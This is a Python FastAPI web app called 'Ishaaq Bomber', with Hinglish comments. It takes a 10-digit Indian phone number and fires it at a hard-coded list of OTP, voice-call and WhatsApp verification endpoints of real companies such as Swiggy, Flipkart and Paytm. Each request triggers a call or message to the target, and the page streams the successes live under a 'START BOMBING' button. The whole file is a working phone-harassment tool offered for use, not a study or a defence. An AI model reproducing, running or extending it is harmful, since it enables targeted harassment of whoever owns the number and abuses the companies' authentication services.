from fastapi import FastAPI
from fastapi.responses import HTMLResponse, StreamingResponse
import httpx
import asyncio
import json
from typing import Dict

app = FastAPI(title="Ishaaq Bomber")

# ULTIMATE_APIS list (same as before - Call + WhatsApp + SMS)
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Goibibo Voice Call", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},

    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},

    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'},
    # Agar aur APIs add karne hain to yahan daal do
]

@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html>
        <head><title>Ishaaq Bomber</title></head>
        <body style="font-family: Arial; background:#000; color:#0f0; text-align:center; padding:50px;">
            <h1>💣 Ishaaq Bomber</h1>
            <form action="/start" method="get">
                <input type="text" name="number" placeholder="10 digit number" maxlength="10" style="padding:12px; font-size:18px; width:280px;" required>
                <button type="submit" style="padding:12px 25px; font-size:18px; background:#0f0; color:#000; border:none;">🚀 START BOMBING</button>
            </form>
        </body>
    </html>
    """

@app.get("/start", response_class=HTMLResponse)
async def start_page(number: str):
    if not number.isdigit() or len(number) != 10:
        return HTMLResponse("<h2 style='color:red'>Invalid 10 digit number!</h2>")

    html = f"""
    <html>
    <head>
        <title>Bombing +91{number}</title>
        <style>
            body {{ background:#000; color:#0f0; font-family:monospace; padding:20px; line-height:1.6; }}
            .log {{ margin:15px 0; white-space:pre-wrap; }}
            .success {{ color:lime; }}
            .failed {{ color:#ff5555; }}
            h1 {{ color:#0f0; }}
        </style>
    </head>
    <body>
        <h1>Bombing Started on +91{number}</h1>
        <div id="logs" class="log"></div>

        <script>
            const eventSource = new EventSource(`/bomb?number={number}`);
            
            eventSource.onmessage = function(event) {{
                const data = JSON.parse(event.data);
                const logsDiv = document.getElementById('logs');
                
                if (data.type === "result") {{
                    const color = data.status === "success" ? "lime" : "#ff5555";
                    logsDiv.innerHTML += `<span style="color:\( {{color}}">[ \){{data.name}}] → ${{data.status.toUpperCase()}} | ${{data.message}}</span><br>`;
                }} 
                else if (data.type === "summary") {{
                    logsDiv.innerHTML += `<br><strong style="color:lime">✅ Completed! Success: ${{data.success}} / ${{data.total}}</strong>`;
                    eventSource.close();
                }}
                
                window.scrollTo(0, document.body.scrollHeight);
            }};

            eventSource.onerror = function() {{
                document.getElementById('logs').innerHTML += '<br><span style="color:yellow">Connection closed.</span>';
            }};
        </script>
    </body>
    </html>
    """
    return HTMLResponse(html)

@app.get("/bomb")
async def bomb_stream(number: str):
    if not number.isdigit() or len(number) != 10:
        return {"error": "Invalid number"}

    async def event_generator():
        async with httpx.AsyncClient(timeout=10.0) as client:
            success_count = 0
            for api in ULTIMATE_APIS:
                result = await send_single_request(client, api, number)
                
                # Har API ka result turant bhej do (line by line)
                yield f"data: {json.dumps({'type': 'result', **result})}\n\n"
                
                if result["status"] == "success":
                    success_count += 1
                
                # Thoda delay for better visibility (optional)
                await asyncio.sleep(0.1)

        # Final summary
        summary = {
            "type": "summary",
            "success": success_count,
            "total": len(ULTIMATE_APIS),
            "number": number
        }
        yield f"data: {json.dumps(summary)}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")

async def send_single_request(client: httpx.AsyncClient, api: Dict, phone: str):
    try:
        url = api["url"](phone) if callable(api.get("url")) else api["url"]
        data = api["data"](phone) if callable(api.get("data")) and api.get("data") else None

        if api["method"] == "POST":
            if isinstance(data, str) and "json" in str(api["headers"].get("Content-Type", "")).lower():
                response = await client.post(url, headers=api["headers"], content=data)
            elif data:
                response = await client.post(url, headers=api["headers"], data=data)
            else:
                response = await client.post(url, headers=api["headers"])
        else:
            response = await client.get(url, headers=api["headers"])

        status = "success" if response.status_code in [200, 201, 202, 204] else "failed"
        return {
            "name": api["name"],
            "status": status,
            "message": f"HTTP {response.status_code}"
        }

    except Exception as e:
        return {
            "name": api["name"],
            "status": "failed",
            "message": f"Error: {str(e)[:70]}"
        }